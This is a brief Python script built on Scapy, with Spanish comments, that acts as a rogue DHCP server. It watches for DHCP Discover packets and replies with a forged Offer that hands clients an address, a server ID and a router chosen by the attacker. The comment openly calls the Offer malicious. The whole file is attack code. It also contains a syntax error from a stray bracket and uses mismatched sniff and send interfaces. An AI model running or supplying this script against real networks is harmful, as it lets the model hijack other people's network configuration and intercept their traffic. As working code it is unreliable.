from scapy.all import *

def dhcp_rogue(pkt):
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1:  # Si es Discover
        print(f"Detectado Discover de {pkt[Ether].src}. Enviando Offer malicioso...")

        offer_pkt = Ether(dst=pkt[Ether].src]) / \
            IP(src="10.15.80.3", dst="255.255.255.255") / \
            UDP(sport=67, dport=68) / \
            BOOTP(
                op=2,
                yiaddr="10.15.80.20",
                siaddr="10.15.80.3",
                chaddr=mac2str(pkt[Ether].src)
            ) / \
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", "10.15.80.3"),
                ("router", "10.15.80.1"),
                "end"
            ])

        sendp(offer_pkt, iface="eth0", verbose=1)

sniff(filter="udp and (port 67 or 68)", prn=dhcp_rogue, iface="ens3")

